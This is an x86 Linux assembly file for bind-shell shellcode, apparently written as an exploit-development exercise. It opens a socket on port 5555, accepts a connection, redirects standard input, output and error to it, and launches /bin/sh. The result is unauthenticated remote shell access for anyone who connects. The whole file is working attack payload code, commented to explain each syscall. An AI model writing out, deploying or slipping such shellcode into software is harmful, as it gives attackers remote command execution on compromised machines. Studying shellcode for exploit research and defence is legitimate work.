; bind.asm
; Author: Rob Williams



global _start

section .text

_start:

	;======== SOCKET CODE ======
	; zero out the registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	; setup int socket(AF_Net(2), SYS_SOCKET(1), 0);
	mov ax, 0x167     ; syscall for socket
	mov bl, 0x2     ; the communication domain of AF_NET
	mov cl, 0x1     ; sys_socket
				   ; edx is already 0 for the protocol value

	int 0x80 ; send the interrupt

	; the socket identifier will be saved into eax.  save it for use in follow-on structures
	mov edi, eax

;====== END OF SOCKET CODE =====

;====== BIND CODE =====

mov ebx, edi     ; move sockfd file descriptor to EBX

; setup sockaddr structure and place it into ECX
xor eax, eax
xor ecx, ecx
push eax ; 0 for INADDR_ANY
push word 0xb315 ; port 5555 
push word 0x2 ; AF_INET
mov ecx, esp


; EDX must be sizeof(struct sockaddr)
; defined as 16 in /usr/include/linux/in.h
mov dl, 0x10

;call bind syscall 361 (0x169)
mov ax, 0x169

int 0x80

;====== END OF BIND CODE =====

;====== LISTEN CODE =====

; recreate the c code: listen(sockfd, 0);
; syscall listen = 363 (0x16B)
xor eax, eax
mov ebx, edi ; move sockfd file description to EBX
xor ecx, ecx ; zero ecx
mov ax, 0x16B ; put the listen interrupt into eax
int 0x80 ; call interrupt

;====== END OF LISTEN CODE =====

;======= ACCEPT CODE =======
; recreate the c code: resultfd = accept(sockfd, NULL, NULL);
; syscall for accept is 0x16C
; socketfd is stored in EDI
xor eax, eax
mov ax, 0x16c ; syscall for accept
mov ebx, edi ;socketfd
xor ecx, ecx
xor edx, edx

int 0x80
; store the result of the accept call into ESI for DUP2 use
xor esi, esi
mov esi, eax

;====== END OF ACCEPT CODE =====
;======= DUP2 CODE =======

;recreate the following C code
;dup2(resultfd, 2);
;dup2(resultfd, 1);
;dup2(resultfd, 0);
xor eax, eax
mov al, 0x3F ; syscall dup2 = 63
mov ebx, esi ; move resultfd to ebx
mov cl, 0x1
int 0x80

xor eax, eax
mov al, 0x3F ; syscall dup2 = 63
mov ebx, esi ; move resultfd to ebx
mov cl, 0x2
int 0x80

xor eax, eax
mov al, 0x3F ; syscall dup2 = 63
mov ebx, esi ; move resultfd to ebx
mov cl, 0x0
int 0x80

;====== END OF DUP2 CODE =====

;======= EXECVE CODE =======
;recreate c code: execve("/bin/sh", NULL, NULL);

; PUSH the first null dword
xor eax, eax
push eax

; push in reverse //bin/sh (8 char)
push 0x68732f6e ; hs/n
push 0x69622f2f ; ib//
mov ebx, esp

push eax
mov edx, esp

push ebx
mov ecx, esp


mov al, 11
int 0x80

;======= END OF EXECVE CODE =======
